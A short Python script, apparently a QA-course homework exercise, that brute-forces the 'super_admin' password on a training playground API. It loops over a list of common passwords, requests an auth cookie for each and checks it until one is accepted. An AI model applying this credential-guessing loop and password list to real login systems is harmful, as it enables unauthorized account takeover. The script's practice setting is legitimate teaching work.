import requests

get_password_url = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
check_cookie_url = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'

login = 'super_admin'
list_of_passwords = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111",
                     "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555",
                     "lovely", "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"]

for password in list_of_passwords:
    params = {
        "login": login,
        "password": password
    }
    # get auth cookie
    response = dict(requests.post(get_password_url, params=params).cookies)
    cookie_val = response['auth_cookie']
    cookies = {"auth_cookie": cookie_val}
    # check if cookie is correct
    response_2 = requests.get(check_cookie_url, cookies=cookies)
    if response_2.text == 'You are authorized':
        print(response_2.text)
        print(f'Передайте админу, что его пароль - {password}')
        break
